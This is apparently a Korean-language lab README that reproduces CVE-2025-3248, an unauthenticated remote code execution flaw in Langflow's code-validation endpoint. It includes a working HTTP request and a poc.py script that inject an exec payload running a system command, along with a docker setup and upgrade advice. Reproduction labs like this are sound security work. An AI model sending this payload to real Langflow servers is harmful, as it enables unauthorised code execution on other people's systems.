# CVE-2025-3248 Langflow API 원격 코드 실행 취약점

### 1. 취약점 요약 
Langflow의 /api/v1/validate/code 엔드포인트에서 발생하는 원격 코드 실행 취약점이다. 

해당 취약점을 악용할 경우, 인증되지 않은 공격자가 서버에서 임의의 코드를 실행할 수 있다.

### 2. 환경 구성 
다음 명령어를 실행하면 취약한 환경구성과 poc.py까지 자동으로 실행된다.
```
docker compose up -d
```

### 3. 취약점 설명


취약한 조건은 다음과 같다.
- Langflow 버전이 1.3.0 미만
- 인증되지 않은 사용자가 /api/v1/validate/code 엔드포인트에 접근 가능해야 함

### 4. 재현 절차 
`http://your-id:7860/api/v1/validate/code`에 POST 방식으로 다음과 같은 악의적인 요청을 보낸다.
```
POST /api/v1/validate/code HTTP/1.1
Host: localhost:7860
sec-ch-ua-platform: "macOS"
Accept-Language: ko-KR,ko;q=0.9
Accept: application/json, text/plain, */*
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Content-type:application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 111

{"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"}

```
![](./1.png)
### 5. PoC 코드
poc.py는 POST 요청으로 `/api/v1/validate/code` 엔드포인트에 악의적인 요청을 보낸다.
```
import os
import requests

target_url = os.getenv("TARGET_URL", "http://web:7860").rstrip("/")
url = f"{target_url}/api/v1/validate/code"

data = {
    "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"
}

print(f"[*] Sending PoC request to {url}")

response = requests.post(url, json=data, timeout=15)

print(f"[*] HTTP {response.status_code}")

try:
    print(response.json())
except requests.exceptions.JSONDecodeError:
    print(response.text)

```

### 6. 실행결과
![](./2.png)

### 7. 대응방안
Langflow 1.3.0 이상의 버전으로 업데이트를 한다.

### 8. 참고자료
- https://github.com/fDarkShadow/noctis/issues/186
